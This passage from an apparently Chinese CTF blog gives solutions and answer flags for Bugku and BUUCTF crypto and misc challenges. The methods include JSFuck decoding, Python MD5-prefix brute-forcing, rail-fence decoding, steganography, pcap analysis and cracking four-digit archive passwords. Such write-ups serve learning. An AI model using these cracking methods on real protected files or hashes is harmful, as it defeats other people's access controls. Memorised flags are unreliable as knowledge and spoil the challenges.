])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure>
<p>是jsfuck编码，直接在谷歌控制台解码<br>flag{a0448fd730b62c13ca80200c4529daa2}</p>
<h2 id="救世捷径"><a href="#救世捷径" class="headerlink" title="救世捷径"></a>救世捷径</h2><p>题目叙述：一个名叫CPU的神秘大陆有26个国家，有些国家之间会有一条无向路，每条路径都有不同的长度和一段神秘代码，救世主尼奥要从国家1出发，赶往国家26拯救大陆，请你帮助救世主选择最短路径，而走过的路的神秘代码连接起来便是flag。 以下是数行数据，每行第一个，第二个数字代表这条路的两个端点国家，第三个数字代表路途长度，最后一个字符串便是神秘代码。路在附件中~ 帮助救世主尼奥吧，他快被吓尿了。。。<br><img src="http://q63cs67co.bkt.clouddn.com/shortest_road.png" alt=""></p>
<h2 id="萌萌哒八戒"><a href="#萌萌哒八戒" class="headerlink" title="萌萌哒八戒"></a>萌萌哒八戒</h2><p>题目叙述：萌萌哒的八戒原来曾经是猪村的村长，从远古时期，猪村就有一种神秘的代码。请从附件中找出代码，看看萌萌哒的猪八戒到底想说啥<br>一张图片，图片底部图案明显是猪圈密码，解密即可whenthepigwanttoeat</p>
<h2 id="残缺的哈希值"><a href="#残缺的哈希值" class="headerlink" title="残缺的哈希值"></a>残缺的哈希值</h2><p>题目叙述：小明一直将电脑密码的哈希值写在纸上，结果一不小心将墨水撒在了上面，只看得到前10位是c2979c7124，小明只记得密码是4位的数字加字母，你能帮小明恢复密码的哈希值吗？（提示：flag为密码的哈希值）<br>写个python跑一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from io import StringIO</span><br><span class="line">import hashlib</span><br><span class="line">import operator</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed=<span class="string">"1234567890abcdefghijklmnoopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line">def get_pwd(str, num):  </span><br><span class="line">        <span class="keyword">if</span>(num == 1):  </span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> str:  </span><br><span class="line">                yield x  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> str:  </span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> get_pwd(str, num-1):</span><br><span class="line">                    yield x+y                 </span><br><span class="line"></span><br><span class="line">strKey=<span class="string">"1234567890abcdefghijklmnoopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> get_pwd(strKey,4):  </span><br><span class="line">    stra=x</span><br><span class="line">    m2 = hashlib.md5()</span><br><span class="line">    m2.update(stra.encode(<span class="string">"utf-8"</span>)) </span><br><span class="line">    stra2=m2.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (stra2[:10]==<span class="string">"c2979c7124"</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"flag&#123;"</span>+stra+<span class="string">"&#125;"</span>)</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure>
<p>爆破后为flag{OK98}<br>对OK98进行MD5加密，c2979c71244dec2befc6e369941c6546</p>
<h2 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h2><p>flag{wethinkwehavetheflag}，是栅栏密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">e = input(<span class="string">'请输入要解密的字符串:'</span>)</span><br><span class="line">elen = len(e)</span><br><span class="line">field=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2,elen):</span><br><span class="line">            <span class="keyword">if</span>(elen%i==0):</span><br><span class="line">                field.append(i)</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</span><br><span class="line">    b = elen // f</span><br><span class="line">    result = &#123;x:<span class="string">''</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):</span><br><span class="line">        a = i % b</span><br><span class="line">        result.update(&#123;a:result[a] + e[i]&#125;)</span><br><span class="line">    d = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</span><br><span class="line">        d = d + result[i]</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">'分为'</span>+str(f)+<span class="string">'栏时，解密结果为：  '</span>+d+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<p>分为13栏时，解密结果为：  flag{wethinkwehavetheflag}</p>
<h2 id="还原大师"><a href="#还原大师" class="headerlink" title="还原大师"></a>还原大师</h2><p>题目叙述：我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的32位MD5码。但是我们获得它的32位MD5码也是残缺不全，E903???4DAB????08?????51?80??8A?,请猜出神秘字符串的原本模样，并且提交这个字串的32位MD5码作为答案。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">strKey1=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> </span><br><span class="line"><span class="keyword">for</span> ch1 <span class="keyword">in</span> strKey1:</span><br><span class="line">    <span class="keyword">for</span> ch2 <span class="keyword">in</span> strKey1:</span><br><span class="line">        <span class="keyword">for</span> ch3 <span class="keyword">in</span> strKey1:</span><br><span class="line">            stra=<span class="string">"TASC"</span>+ch1+<span class="string">"O3RJMV"</span>+ch2+<span class="string">"WDJKX"</span>+ch3+<span class="string">"ZM"</span></span><br><span class="line">            m2 = hashlib.md5()</span><br><span class="line">            m2.update(stra.encode(<span class="string">"utf-8"</span>)) </span><br><span class="line">            stra2=m2.hexdigest().upper()</span><br><span class="line">            <span class="keyword">if</span> (stra2[:4]==<span class="string">"E903"</span> and stra2[7:11]==<span class="string">"4DAB"</span>):</span><br><span class="line">                <span class="built_in">print</span>(stra)</span><br><span class="line">                <span class="built_in">print</span>(stra2)</span><br><span class="line">                <span class="built_in">break</span></span><br></pre></td></tr></table></figure>
<p>结果为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TASCJO3RJMVKWDJKXLZM</span><br><span class="line">E9032994DABAC08080091151380478A2</span><br></pre></td></tr></table></figure>
<h2 id="一张谍报"><a href="#一张谍报" class="headerlink" title="一张谍报"></a>一张谍报</h2><p>题目叙述：国家能源总部经过派出卧底长期刺探，终于找到一个潜伏已久的国外内鬼：三楼能源楼管老王。由于抓捕仓促，老王服毒自尽了。侦查部门搜出老王每日看的报纸原来是特制的情报。聪明的你能从附件的报纸中找出情报么？flag是老王说的暗号。（由于老王的线人曾今做的土匪，所以用的行话）<br>这个是真的不会，以为有什么行话解密之类的，结果没有搜到。去看了大佬们的wp,都没说这是个啥。。。搬了大佬的代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:gbk -*-</span></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'gbk'</span>)</span><br><span class="line">strs1 = <span class="string">"今天上午，朝歌区梆子公司决定，在每天三更天不亮免费在各大小区门口设卡为全城提供二次震耳欲聋的敲更提醒，呼吁大家早睡早起，不要因为贪睡断送大好人生，时代的符号是前进。为此，全区老人都蹲在该公司东边树丛合力抵制，不给公司人员放行，场面混乱。李罗鹰住进朝歌区五十年了，人称老鹰头，几年孙子李虎南刚从东北当猎户回来，每月还寄回来几块鼹鼠干。李罗鹰当年遇到的老婆是朝歌一枝花，所以李南虎是长得非常秀气的一个汉子。李罗鹰表示：无论梆子公司做的对错，反正不能打扰他孙子睡觉，子曰：‘睡觉乃人之常情’。梆子公司这是连菩萨睡觉都不放过啊。李南虎表示：梆子公司智商捉急，小心居民猴急跳墙！这三伏天都不给睡觉，这不扯淡么！到了中午人群仍未离散，更有人提议要烧掉这个公司，公司高层似乎恨不得找个洞钻进去。直到治安人员出现才疏散人群归家，但是李南虎仍旧表示爷爷年纪大了，睡不好对身体不好。"</span></span><br><span class="line">strs2 = <span class="string">"喵天上午，汪歌区哞叽公司决定，在每天八哇天不全免费在各大小区门脑设卡为全城提供双次震耳欲聋的敲哇提醒，呼吁大家早睡早起，不要因为贪睡断送大好人生，时代的编号是前进。为此，全区眠人都足在该公司流边草丛合力抵制，不给公司人员放行，场面混乱。李罗鸟住进汪歌区五十年了，人称眠鸟顶，几年孙叽李熬值刚从流北当屁户回来，每月还寄回来几块报信干。李罗鸟当年遇到的眠婆是汪歌一枝花，所以李值熬是长得非常秀气的一个汉叽。李罗鸟表示：无论哞叽公司做的对错，反正不能打扰他孙叽睡觉，叽叶：‘睡觉乃人之常情’。哞叽公司这是连衣服睡觉都不放过啊。李值熬表示：哞叽公司智商捉急，小心居民猴急跳墙！这八伏天都不给睡觉，这不扯淡么！到了中午人群仍未离散，哇有人提议要烧掉这个公司，公司高层似乎恨不得找个洞钻进去。直到治安人员出现才疏散人群归家，但是李值熬仍旧表示爷爷年纪大了，睡不好对身体不好。"</span></span><br><span class="line">strs3 = <span class="string">"喵汪哞叽双哇顶，眠鸟足屁流脑，八哇报信断流脑全叽，眠鸟进北脑上草，八枝遇孙叽，孙叽对熬编叶：值天衣服放鸟捉猴顶。鸟对：北汪罗汉伏熬乱天门。合编放行，卡编扯呼。人离烧草，报信归洞，孙叽找爷爷。"</span></span><br><span class="line">strs1 = unicode(strs1,<span class="string">"gbk"</span>)</span><br><span class="line">strs2 = unicode(strs2,<span class="string">"gbk"</span>)</span><br><span class="line">strs3 = unicode(strs3,<span class="string">"gbk"</span>)</span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(strs3)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(strs2)):</span><br><span class="line">        <span class="keyword">if</span> strs3[i] == strs2[j]:</span><br><span class="line">            res += strs1[j]</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> res</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Bugku-Misc</title>
    <url>/2020/01/28/Bugku-Misc/</url>
    <content><![CDATA[<h2 id="手机热点"><a href="#手机热点" class="headerlink" title="手机热点"></a>手机热点</h2><p>题目描述：httppan.baidu.coms1cwwdVC 有一天皓宝宝没了流量只好手机来共享，顺便又从手机发了点小秘密到电脑，你能找到它吗？<br>给了一个流量包，wireshark打开后，啥也没发现。注意到流量包的文件名是Blatand_1.pcapng，去搜了一下Blatand是哈拉尔蓝牙王，再根据题目可以猜测是通过蓝牙传输数据，去搜了一下蓝牙数据交换协议，找到了obex协议，再在wireshark中去找obex协议，发现了压缩包<br><img src="http://q63cs67co.bkt.clouddn.com/Blatand.PNG" alt=""><br>另存为secret.rar文件，打开后是一张图片<br><img src="http://q63cs67co.bkt.clouddn.com/flag.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF-Misc</title>
    <url>/2020/01/09/BUUCTF-Misc/</url>
    <content><![CDATA[<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>一张金正恩的动图，可以发现动图里面有字母闪过，用Gifsplitter将动图分解，得到flag{he11ohongke}</p>
<a id="more"></a>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>压缩包里是张二维码，扫过后内容是secret is here,应该是图片隐写，用winhex打开，发现里面隐写零了一个4number.txt的文件，上kali，分离出了一个压缩包，里面就是4number.txt文件，但是被加密了，从文件名可以看出密码由四位数字组成，直接暴力破解，密码为7639，输入密码，成功打开文件，拿到CTF{vjpw_wnoei}</p>
<h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>压缩包种是一个KEY.exe文件，但是却无法执行，用winhex打开,发现是可转图片的base64编码，直接解码，解码后是一张二维码，扫描后拿到KEY{dca57f966e4e4e31fd5b15417da63269}</p>
<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>题目叙述：看不到图？ 是不是屏幕太小了<br>明显图片高度被修改，修改图片高度后，出现flag{He1l0_d4_ba1}</p>
<h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>题目叙述：给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对= =我说了什么了不得的东西。。<br>题目中说密码是4位数字，用ARCHPR暴力破解，密码为2563，打开文件，文件内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</span><br></pre></td></tr></table></figure>
<p>明显是base64，解密后拿到flag{70354300a5100ba78068805661b93a5c}</p>
<h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>打开后是张图片，感觉是图片隐写，用winhex打开后在ASCII码的最下方发现flag{stego_is_s0_bor1ing}</p>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>LSB最低有效位隐写，用stegsolve打开，发现出现了png字样，保存为png文件，是一个二维码，扫后cumtctf{1sb_i4_s0_Ea4y}</p>
<h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>题目叙述：乌镇互联网大会召开了，各国巨头汇聚一堂，他们的照片里隐藏着什么信息呢？<br>winhex打开后在最下面发现<br>flag{97314e7864a8f62627b26f3f998c37f1}</p>
<h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>题目叙述：这个是一个rar文件，里面好像隐藏着什么秘密，但是压缩包被加密了，毫无保留的告诉你，rar的密码是4位纯数字。<br>题目告诉了压缩包密码为四位数字，直接暴力破解，密码为8795，<br>打开文件后拿到flag{1773c5da790bd3caff38e3decd180eb7}</p>
<h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>题目叙述：这是一个二维码，谁用谁知道！<br>给了一张二维码，而且题目就叫qr,所以直接用QR打开，拿到Flag{878865ce73370a4ce607d21ca01b5e59}</p>
<h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>题目叙述：人类的科学日益发展，对自然的研究依然无法满足，传闻日本科学家秋明重组了基因序列，造出了名为ningen的超自然生物。某天特工小明偶然截获了日本与俄罗斯的秘密通信，文件就是一张ningen的特写，小明通过社工，知道了秋明特别讨厌中国的六位银行密码，喜欢四位数。你能找出黑暗科学家秋明的秘密么？<br>图片用winhex打开后发现有ningen.txt文件，上kali,分理处一个被加密的压缩包，题中提到密码是4位数字，直接暴力破解，flag{b025fc9ca797a67d2103bfbc407a6d5f}</p>
<h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>题目叙述：小明经常喜欢在文件中藏一些秘密。时间久了便忘记了，你能帮小明找到该文件中的秘密吗？<br>给了一张图片，正常思路，先用winhex打开，结果啥也没发现，最后用exiftool打开拿到<br>flag{870c5a72806115cb5439345d8b014396}</p>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>题目叙述：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)<br>显然是一道流量分析题，wireshark打开，题目中说答案是管理员密码，直接分组字节流查找字符串pass，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">email=flag&amp;password=ffb7567a1d4f4abdffdb54e022f8facd</span><br></pre></td></tr></table></figure>
<h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>给了一张图片，图片名是steg.png,应该是用stegsolve打开，没发现啥，就用winhex打开，还是没发现，最后觉得还是要用stegsolve,就想可能是LSB，试了一下，还真是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hey I think we can write  safely <span class="keyword">in</span> this  file without any one seeing it. Anyway, the secre t key is: st3g0_ saurus_wr3cks</span><br></pre></td></tr></table></figure>
<h2 id="小明的保险柜"><a href="#小明的保险柜" class="headerlink" title="小明的保险柜"></a>小明的保险柜</h2><p>题目叙述：小明有一个保险箱，里面珍藏了小明的日记本，他记录了什么秘密呢？。。。告诉你，其实保险箱的密码四位纯数字密码。<br>图片隐写，上kali，分离出来被加密的压缩包，暴力破解，flag{75a3d68bf071ee188c418ea6cf0bb043}</p>
<h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>给了一张图片，用winhex打开，发现其中隐写了flag.txt文件，上kali,分离出两个被加密的压缩包，又回去看winhex，在里面发现了一段字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">this_is_not_password</span><br></pre></td></tr></table></figure>
<p>试一下，发现两个压缩包中的一个的密码就是这个字符串，flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p>
<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>题目叙述：某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？<br>给了一个流量包，用wireshark打开，发现该文件是图片</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP	375	POST /upload.php HTTP/1.1  (JPEG JFIF image)</span><br></pre></td></tr></table></figure>
<p>追踪TCP流，找到flag{da73d88936010da1eeeb36e945ec4b97}</p>
<h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>一张海伦凯勒的照片，一个被加密的压缩包。照片下面有堆奇怪的符号，看图片和题目，应该是盲文，翻译后为KMDONOWG，去解压压缩包，发现不行，换成小写解压成功，打开后是一个音频文件，播放可以发现应该是摩斯密码，用Audacity打开，宽的为-,短的为.,空格就为空格分界，<br>转换为摩斯密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..</span><br></pre></td></tr></table></figure>
<p>，解密后为CTFWPEI08732?23DZ<br>大写提交不对，换成小写成功flag{wpei08732?23dz}</p>
<h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>流量包分析题，wireshark打开，追踪TCP流，直接拿到flag{385b87afc8671dee07550290d16a8071}</p>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>winhex打开，发现有隐写，上kali，binwalk发现有个压缩包，结果没分离出来。接着就用stegsolve的LSB最低有效位，发现是PK开头，保存为zip文件，打开后，里面有个文件，用winhex打开，<br>发现hctf{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p>
<h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>winhex打开，在最下面发现了一串二进制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">01101011011011110110010101101011011010100011001101110011</span><br></pre></td></tr></table></figure>
<p>第一反应是转为摩斯密码，结果试了一下，并不行。就转为16进制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">6b6f656b6a3373</span><br></pre></td></tr></table></figure>
<p>提交发现不对，又转为ASCII码koekj3s，提交成功</p>
<h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>给了一个conf.bin文件，根据题目所说，宽带泄露，就不难想到用RouterPassView,直接搜索password,有两个，结果都不对，又搜索了username：053700357621，拿到flag</p>
<h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>题目叙述：路飞一行人千辛万苦来到了伟大航道的终点，找到了传说中的One piece，但是需要钥匙才能打开One Piece大门，钥匙就隐藏在下面的图片中，聪明的你能帮路飞拿到钥匙，打开One Piece的大门吗？<br>给了一张照片，用winhex打开，未发现特殊之处，怀疑隐写，搜索FFD9，结果在第一张照片结尾发现flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</span><br></pre></td></tr></table></figure>
<p>提示的很明显了，解码base64即可，解码后377cbadda1eca2f2f73d36277781f00a</p>
<h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>给了一个wav文件，用Audacity打开，发现左声道形似摩斯密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</span><br></pre></td></tr></table></figure>
<p>解码后拿到5BC925649CB0188F52E617D70929191C</p>
<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>题目叙述：小白的网站被小黑攻击了，并且上传了Webshell，你能帮小白找到这个后门么？(Webshell中的密码(md5)即为答案)。<br>给了一个网站的文件，用D盾查杀一下整个文件，发下<br>html\include\include.php被查杀为木马文件，打开这个文件，发现<br>$pass  = ‘6ac45fb83b3bc355c024f5034b947dd3’;</p>
<h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>题目叙述：神秘龙卷风转转转，科学家用四位数字为它命名，但是发现解密后居然是一串外星人代码！！好可怕！<br>一个被加密的压缩包，根据题目所说密码为四位数字，直接爆破，密码为5463，打开压缩包后有个文本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">                       +++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">                            +++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++</span><br><span class="line">                                   +++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">                                         ++++++++++++++++++++++++++++++++++++</span><br><span class="line">                                            ++++++.&gt;++++++++++++++++++++++</span><br><span class="line">                                              ++++++++++++++++++++++++++</span><br><span class="line">                                               ++++++++++++++++++++++++</span><br><span class="line">                                                ++++++++++++++++++++++</span><br><span class="line">                                                 +++++++++.&gt;+++++++++</span><br><span class="line">                                                  ++++++++++++++++++</span><br><span class="line">                                                  ++++++++++++++++++</span><br><span class="line">                                                  ++++++++++++++++++</span><br><span class="line">                                                  ++++++++++++++++++</span><br><span class="line">                                                 ++++++++++++++++++++</span><br><span class="line">                                               ++++++++++++++++++++++.&gt;</span><br><span class="line">                                             +++++++++++++++++++++++++++</span><br><span class="line">                                           +++++++++++++++++++++++++++++++</span><br><span class="line">                                        +++++++++++++++++++++++++++++++++++++</span><br><span class="line">                                      ++++++.&gt;++++++++++++++++++++++++++++++++++</span><br><span class="line">                                    ++++++++++++++++++.&gt;+++++++++++++++++++++++++++</span><br><span class="line">                                  ++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">                                +++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++</span><br><span class="line">                            ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++</span><br><span class="line">                         ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">                      +++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">                   +++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++</span><br><span class="line">                +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++</span><br><span class="line">            